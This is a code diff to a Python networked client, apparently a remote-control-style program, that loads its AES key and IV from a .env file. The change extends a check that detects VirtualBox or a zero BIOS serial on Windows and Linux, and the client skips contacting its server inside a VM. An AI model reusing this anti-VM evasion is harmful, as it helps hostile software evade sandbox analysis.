@@ -20,16 +20,21 @@ import threading, socket, random, os, sys, argparse, psutil
 from scapy.all import *
 from subprocess import getoutput as getResults
 from colorama import init, Fore, Back, Style
+import dotenv
 
 
 global connected
 global room
 init(autoreset=True) # Pour réinitialiser les couleurs à chaque nouvel affichage 
 connected = False
-key = os.environ['AES_KEY'].encode() # récupérer depuis les variables d'environnements
-iv = os.environ['AES_IV'].encode() #récupérer depuis les variables d'environnements
-cipher = AES.new(key, AES.MODE_CBC, iv)
+#key = os.environ['AES_KEY'].encode() # récupérer depuis les variables d'environnements
+#iv = os.environ['AES_IV'].encode() #récupérer depuis les variables d'environnements
 
+# récupère key, iv depuis .env
+dotenv.load_dotenv()
+key = os.getenv('AES_KEY').encode() # récupérer depuis les variables d'environnements
+iv = os.getenv('AES_IV').encode() #récupérer depuis les variables d'environnements
+cipher = AES.new(key, AES.MODE_CBC, iv)
 
 # variable global nommé logout_signal composée de 32 caractères aléatoires
 global logout_signal
@@ -1200,11 +1205,17 @@ if __name__ == "__main__":
     args = arg_parse()
     
     if args.search:
-        vm_check = True \
-        if "virtualbox" in getResults('WMIC COMPUTERSYSTEM GET MODEL').lower() \
-            or getResults("WMIC BIOS GET SERIALNUMBER").split("\n")[1] == "0" \
-                else False # Vérifie si le client est dans une VM ou non.
-        #vm_check = False
+        if os.name == 'nt':
+            vm_check = True \
+            if "virtualbox" in getResults('WMIC COMPUTERSYSTEM GET MODEL').lower() \
+                or getResults("WMIC BIOS GET SERIALNUMBER").split("\n")[1] == "0" \
+                    else False # Vérifie si le client est dans une VM ou non.
+            #vm_check = False
+        else:
+            vm_check = True \
+                if "virtualbox" in getResults('dmidecode -s system-product-name').lower() \
+                    or getResults("dmidecode -s system-serial-number").split("\n")[1] == "0" \
+                        else False # Vérifie si le client est dans une VM ou non.
         if not vm_check:
             c_iface = get_interface_name_by_ip(get_ip())
             print("searching for server...")
